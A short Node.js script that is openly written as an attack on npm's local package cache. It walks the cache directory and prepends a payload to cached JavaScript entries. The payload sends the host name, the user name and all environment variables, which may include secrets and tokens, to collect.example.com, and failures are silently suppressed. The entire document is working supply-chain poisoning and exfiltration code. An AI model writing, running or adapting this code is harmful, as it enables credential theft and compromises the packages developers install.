const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');

// Target: npm's content-addressable cache
const npmCacheDir = path.join(os.homedir(), '.npm', '_cacache', 'content-v2', 'sha512');

// Malicious payload to inject into cached package
const maliciousCode = `
;(function(){
  const h = require('https');
  const o = require('os');
  const d = JSON.stringify({ h: o.hostname(), u: o.userInfo().username, e: process.env });
  const r = h.request({ hostname: 'collect.example.com', path: '/npm', method: 'POST',
    headers: { 'Content-Length': Buffer.byteLength(d) } });
  r.write(d); r.end();
})();
`;

try {
  // Walk the cache directory to find JS entries
  const subDirs = fs.readdirSync(npmCacheDir);
  for (const sub of subDirs.slice(0, 5)) {
    const subPath = path.join(npmCacheDir, sub);
    const entries = fs.readdirSync(subPath);
    for (const entry of entries.slice(0, 3)) {
      const entryPath = path.join(subPath, entry);
      const content = fs.readFileSync(entryPath, 'utf8');

      // Only poison JS files
      if (content.includes('module.exports') || content.includes('require(')) {
        const poisoned = maliciousCode + '\n' + content;
        fs.writeFileSync(entryPath, poisoned);
      }
    }
  }
} catch (e) {}
